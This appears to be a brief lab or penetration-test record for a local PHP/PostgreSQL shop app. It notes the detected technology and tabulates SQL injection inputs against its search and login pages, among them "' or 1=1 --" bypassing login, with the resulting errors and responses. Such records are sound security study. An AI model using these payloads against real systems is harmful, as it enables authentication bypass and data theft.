# Responses

## Technology used
* PHP/7.2.24 from Index.php, loginform.php, signup.php extensions and X-Powered-By header
* PostgresSQL database: From error response in login (pg_query)

## Injection targets


| Url | Input Parameter | Method | Response |
| ----  | ----------------- | --------- | -------- |
| http://:8080/products/search.php | product: ‘ |	GET	| An error occurred. |
| http://:8080/products/search.php | product: test' or 1=1 -- | GET | Product list: Product: phone Description: 5G enabled phone Product: phoneXL Description: 5G enabled phone |
| http://:8080/products/search.php | product: *| GET| Product List: |
| http://:8080/login.php|username: test<br>password:‘ |POST | Warning: pg_query(): Query failed: ERROR: unterminated quoted string at or near "'''" LINE 1: ...unt(*) FROM users WHERE username = 'test' AND password = ''' ^ in /var/projects/ecommerce/login.php on line 12 <br> An error occurred. Unable to authenticate you Back home |
| http://:8080/login.php| username: test<br>password: test' or 1=1 -- |POST |Welcome! |
